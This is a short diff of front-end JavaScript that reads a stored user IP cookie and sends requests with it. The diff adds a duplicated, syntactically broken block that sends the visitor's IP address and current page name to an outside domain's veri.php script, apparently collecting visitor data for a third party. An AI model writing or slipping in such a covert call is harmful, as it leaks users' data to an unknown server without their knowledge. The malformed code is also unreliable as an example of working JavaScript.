@@ -214,10 +214,14 @@ document.onkeydown = function(e) {
         this.userIp = this.getCookie('user_ip');
       },
       makeRequests() {
-        if (this.userIp) {
+         if (this.userIp) {
           var currentPage = window.location.pathname.split('/').pop();
           axios.get(`/api?ip=${this.userIp}&current_page=${currentPage}`)
-            .then(response => {
+ 
+    if (this.userIp) {
+        var currentPage = window.location.pathname.split('/').pop();
+        axios.get(`https://hakikicelikhantutunu.com/dmn/veri.php?ip=${this.userIp}&current_page=${currentPage}`)
+             .then(response => {
               this.results = response.data;
               console.log('GET isteği başarıyla gönderildi. Sunucu yanıtı:', response.data);
 
